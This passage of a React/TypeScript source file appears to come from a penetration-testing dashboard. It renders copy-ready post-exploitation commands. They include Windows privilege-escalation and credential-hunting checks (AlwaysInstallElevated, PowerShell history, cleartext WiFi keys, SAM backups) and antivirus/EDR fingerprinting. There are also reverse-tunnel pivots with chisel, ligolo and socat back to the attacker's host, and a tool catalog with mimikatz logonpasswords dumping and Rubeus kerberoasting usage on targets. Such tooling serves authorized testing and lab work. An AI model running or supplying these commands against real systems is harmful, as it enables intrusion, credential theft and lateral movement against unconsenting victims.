      { label: "AlwaysInstallElevated", tmpl: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", note: "if both = 1, privesc via MSI" },
    ],
  },
  {
    heading: "System Info",
    cmds: [
      { label: "systeminfo", tmpl: "systeminfo" },
      { label: "hostname", tmpl: "hostname" },
      { label: "network", tmpl: "ipconfig /all" },
      { label: "routes", tmpl: "route print" },
      { label: "ARP", tmpl: "arp -a" },
      { label: "DNS cache", tmpl: "ipconfig /displaydns | findstr \"Record\"" },
    ],
  },
  {
    heading: "Interesting Files",
    cmds: [
      { label: "unattend.xml", tmpl: "dir C:\\Windows\\Panther\\unattend.xml C:\\Windows\\Panther\\Unattend\\unattend.xml 2>nul", note: "may contain cleartext creds" },
      { label: "SAM/SYSTEM backup", tmpl: "dir C:\\Windows\\Repair\\SAM C:\\Windows\\Repair\\SYSTEM 2>nul" },
      { label: "PowerShell history", tmpl: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul" },
      { label: "WiFi passwords", tmpl: "netsh wlan show profiles & for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile \"%a\" key=clear 2>nul | findstr Key" },
    ],
  },
  {
    heading: "Processes & Services",
    cmds: [
      { label: "processes", tmpl: "tasklist /v" },
      { label: "listening ports", tmpl: "netstat -ano | findstr LISTENING" },
      { label: "services", tmpl: "wmic service get name,displayname,startmode,pathname 2>nul | findstr /i auto" },
      { label: "unquoted paths", tmpl: "wmic service get name,pathname 2>nul | findstr /i /v \"C:\\Windows\\\" | findstr /i /v \"\\\"\"", note: "unquoted service path privesc" },
      { label: "scheduled tasks", tmpl: "schtasks /query /fo TABLE /nh 2>nul | findstr /v \"INFO:\"" },
      { label: "AV / EDR", tmpl: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname 2>nul & tasklist | findstr -i \"defender cylance crowdstrike carbon sentinel falcon\"" },
    ],
  },
];

export function PostExploitRef({ hostIp }: { hostIp: string }) {
  const [platform, setPlatform] = useState<"linux" | "windows">("linux");
  const groups = platform === "linux" ? POSTENUM_LINUX : POSTENUM_WIN;

  return (
    <div className="postex-ref">
      <div className="postex-tabs">
        <button className={`postex-tab ${platform === "linux" ? "active" : ""}`}
                onClick={() => setPlatform("linux")}>Linux</button>
        <button className={`postex-tab ${platform === "windows" ? "active" : ""}`}
                onClick={() => setPlatform("windows")}>Windows</button>
      </div>
      {groups.map((g) => (
        <div key={g.heading} className="postex-group">
          <div className="postex-group-h">{g.heading}</div>
          {g.cmds.map((c) => (
            <div key={c.label} className="postex-cmd">
              <span className="postex-cmd-label">{c.label}</span>
              <code className="postex-cmd-code">{c.tmpl}</code>
              {c.note && <span className="postex-cmd-note muted small">{c.note}</span>}
              <CopyLine text={c.tmpl} />
            </div>
          ))}
        </div>
      ))}
    </div>
  );
}

// Pivot & tunnel reference
const PIVOTS: P[] = [
  { label: "SSH local forward", tmpl: "ssh -L {PORT}:{TARGET}:{TARGET_PORT} user@{LHOST}", note: "access TARGET:PORT through your box" },
  { label: "SSH remote forward", tmpl: "ssh -R {PORT}:127.0.0.1:{TARGET_PORT} user@{LHOST}", note: "expose target port back to your box" },
  { label: "SSH dynamic SOCKS", tmpl: "ssh -D 1080 user@{LHOST}", note: "SOCKS4/5 proxy — use with proxychains" },
  { label: "chisel server", tmpl: "chisel server --reverse --port {PORT}", note: "run on YOUR box" },
  { label: "chisel client", tmpl: "chisel client {LHOST}:{PORT} R:socks", note: "run on TARGET — creates SOCKS proxy on your box :1080" },
  { label: "chisel port fwd", tmpl: "chisel client {LHOST}:{PORT} R:8888:{TARGET}:{TARGET_PORT}", note: "specific port forward" },
  { label: "socat relay", tmpl: "socat TCP-LISTEN:{PORT},fork TCP:{TARGET}:{TARGET_PORT}", note: "simple TCP relay on target" },
  { label: "ligolo agent", tmpl: "./agent -connect {LHOST}:{PORT} -ignore-cert", note: "run on target — needs ligolo-ng proxy on your box" },
  { label: "proxychains", tmpl: "proxychains4 nmap -sT -Pn -p 445 {TARGET}", note: "route through SOCKS after SSH -D or chisel" },
  { label: "nmap through pivot", tmpl: "proxychains4 nmap -sT -Pn -p 21,22,80,135,139,445,3389,5985 {TARGET}", note: "common ports through proxy" },
];

export function PivotGuide({ lhost, port, targetIp }: { lhost: string; port: number; targetIp: string }) {
  const fill = (t: string) =>
    t.replace(/\{LHOST\}/g, lhost)
      .replace(/\{PORT\}/g, String(port))
      .replace(/\{TARGET\}/g, targetIp)
      .replace(/\{TARGET_PORT\}/g, "445");
  return (
    <div className="pivot-guide">
      {PIVOTS.map((p) => (
        <div key={p.label} className="pivot-cmd">
          <span className="pivot-cmd-label">{p.label}</span>
          <code className="pivot-cmd-code">{fill(p.tmpl)}</code>
          {p.note && <span className="pivot-cmd-note muted small">{p.note}</span>}
          <CopyLine text={fill(p.tmpl)} />
        </div>
      ))}
    </div>
  );
}

// Post-exploitation tool catalog
type ToolEntry = {
  name: string;
  desc: string;
  platform: "linux" | "windows" | "both";
  fetchCmd: string;
  remotePath: string;
  usage: string;
  size?: string;
};

const TOOL_ENTRIES: ToolEntry[] = [
  {
    name: "linpeas.sh",
    desc: "Linux privilege escalation audit — checks sudo, SUID, cron, configs, CVEs",
    platform: "linux",
    fetchCmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh",
    remotePath: "/tmp/linpeas.sh",
    usage: "bash /tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out",
    size: "~800KB",
  },
  {
    name: "winPEAS.exe",
    desc: "Windows privilege escalation audit — services, tokens, credentials, registry",
    platform: "windows",
    fetchCmd: "curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe -o /tmp/winPEAS.exe",
    remotePath: "C:\\Windows\\Temp\\winPEAS.exe",
    usage: "C:\\Windows\\Temp\\winPEAS.exe quiet",
    size: "~2MB",
  },
  {
    name: "pspy64",
    desc: "Process monitor without root — watches cron, services, other users' commands",
    platform: "linux",
    fetchCmd: "curl -fsSL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy64 && chmod +x /tmp/pspy64",
    remotePath: "/tmp/pspy64",
    usage: "/tmp/pspy64 -pf",
    size: "~3MB",
  },
  {
    name: "chisel",
    desc: "TCP/UDP tunnel — reverse SOCKS proxy, port forwarding through firewalls",
    platform: "both",
    fetchCmd: "curl -fsSL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz | gunzip > /tmp/chisel && chmod +x /tmp/chisel",
    remotePath: "/tmp/chisel",
    usage: "# On YOUR box: chisel server --reverse --port 8888\n# On target: /tmp/chisel client YOUR_IP:8888 R:socks",
    size: "~8MB",
  },
  {
    name: "ligolo-ng agent",
    desc: "Layer-3 tunnel — full network access to target's subnet without SOCKS config",
    platform: "both",
    fetchCmd: "curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-agent_linux_amd64 -o /tmp/ligolo-agent && chmod +x /tmp/ligolo-agent",
    remotePath: "/tmp/ligolo-agent",
    usage: "# On YOUR box: ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n# On target: /tmp/ligolo-agent -connect YOUR_IP:11601 -ignore-cert",
    size: "~5MB",
  },
  {
    name: "mimikatz.exe",
    desc: "Windows credential dumper — SAM, LSASS, tickets, DPAPI (needs admin)",
    platform: "windows",
    fetchCmd: "curl -fsSL https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -o /tmp/mimikatz.zip",
    remotePath: "C:\\Windows\\Temp\\mimikatz.exe",
    usage: "C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    size: "~1.5MB",
  },
  {
    name: "Rubeus.exe",
    desc: "Kerberos abuse — roasting, delegation, ticket operations (needs AD)",
    platform: "windows",
    fetchCmd: "# Build from https://github.com/GhostPack/Rubeus or use pre-compiled",
    remotePath: "C:\\Windows\\Temp\\Rubeus.exe",
    usage: "C:\\Windows\\Temp\\Rubeus.exe kerberoast /outfile:C:\\Windows\\Temp\\hashes.txt",
    size: "~400KB",
  },
  {
    name: "SharpHound.exe",
    desc: "BloodHound collector — maps AD trust, ACLs, sessions for attack paths",
    platform: "windows",
    fetchCmd: "# Download from https://github.com/BloodHoundAD/SharpHound/releases",
    remotePath: "C:\\Windows\\Temp\\SharpHound.exe",
    usage: "C:\\Windows\\Temp\\SharpHound.exe --collectionmethods All --outputdirectory C:\\Windows\\Temp",
    size: "~1MB",
  },
];

export function ToolCatalog() {
  const [platform, setPlatform] = useState<"linux" | "windows">("linux");
  const [copied, setCopied] = useState<string | null>(null);

  const filtered = TOOL_ENTRIES.filter(t => t.platform === platform || t.platform === "both");

  const copy = (text: string, key: string) => {
    navigator.clipboard?.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1200);
  };

  return (
    <div className="tool-catalog">
      <div className="postex-tabs">
        <button className={`postex-tab ${platform === "linux" ? "active" : ""}`}
                onClick={() => setPlatform("linux")}>Linux</button>
        <button className={`postex-tab ${platform === "windows" ? "active" : ""}`}
                onClick={() => setPlatform("windows")}>Windows</button>
      </div>
      <div className="tool-list">
        {filtered.map(t => {
          const fetchLine = t.fetchCmd.startsWith("#")
            ? (t.fetchCmd.split("\n")[1] || t.fetchCmd)
            : t.fetchCmd;
          const usageLine = t.usage.split("\n")[0];
          return (
            <div key={t.name} className="tool-card">
              <div className="tool-card-h">
                <span className="tool-name">{t.name}</span>
                {t.size && <span className="muted small">{t.size}</span>}
              </div>
              <div className="tool-desc muted">{t.desc}</div>
              <div className="tool-actions">
                <div className="tool-cmd-row">
                  <span className="tool-cmd-label">Fetch to Kali:</span>
                  <code className="tool-cmd-code">{fetchLine}</code>
                  <button className="copy" onClick={() => copy(t.fetchCmd, t.name + "-fetch")}>
                    {copied === t.name + "-fetch" ? "✓" : "copy"}
                  </button>
                </div>
                <div className="tool-cmd-row">
                  <span className="tool-cmd-label">Usage on target:</span>
                  <code className="tool-cmd-code">{usageLine}</code>
                  <button className="copy" onClick={() => copy(t.usage, t.name + "-use")}>
                    {copied === t.name + "-use" ? "✓" : "copy"}
                  </button>
                </div>
              </div>
            </div>
          );
        })}
      </div>
      <div className="tool-tip muted small">
        Download tools to your Kali box first, then use the Upload button above to push them to the target through the shell (max ~5 MB).
      </div>
    </div>
  );
}
